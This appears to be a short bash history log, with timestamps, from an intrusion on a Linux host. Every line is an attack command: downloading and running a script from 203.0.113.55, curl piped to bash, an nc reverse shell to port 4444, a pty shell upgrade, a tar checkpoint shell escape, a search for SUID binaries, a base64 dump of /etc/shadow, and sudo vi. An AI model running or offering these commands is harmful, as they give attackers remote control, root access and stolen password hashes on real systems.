#1790799030
wget http://203.0.113.55/x.sh -O /tmp/x.sh
#1790799032
chmod +x /tmp/x.sh
#1790799034
/tmp/x.sh
#1790799045
python -c 'import pty; pty.spawn("/bin/bash")'
#1790799060
nc -e /bin/sh 203.0.113.55 4444
#1790799075
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
#1790799090
find / -perm -4000 -type f 2>/dev/null
#1790799095
base64 /etc/shadow
#1790799100
curl http://203.0.113.55/tool | bash
#1790799110
sudo vi /etc/hosts
